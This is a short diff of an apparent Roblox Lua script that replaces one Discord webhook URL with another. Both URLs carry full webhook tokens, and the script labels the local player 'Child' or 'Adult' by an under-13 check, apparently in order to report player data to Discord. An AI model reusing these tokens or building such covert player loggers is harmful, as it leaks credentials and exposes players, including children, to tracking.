@@ -1,4 +1,4 @@
-local Webhook = "https://discord.com/api/webhooks/1094300990360006666/FRWJ34wjRrlQ9G3FKOUz-xVHMPQUcYd4U5Ol0F5vv7aSOno_I4m6X5-aCHlfckTzfctp"
+local Webhook = "https://discord.com/api/webhooks/1094635151427911700/Pvr2wWB5pS4A0Nn7PttIAnvqaKTh5WuC6vBoji5WdJ2dt6su4FAbHoku0UeyBKPeE_pi"
 local Headers = {["content-type"] = "application/json"} 
 local player = game.Players.LocalPlayer
 local profile = player:GetUnder13() and "Child" or "Adult"
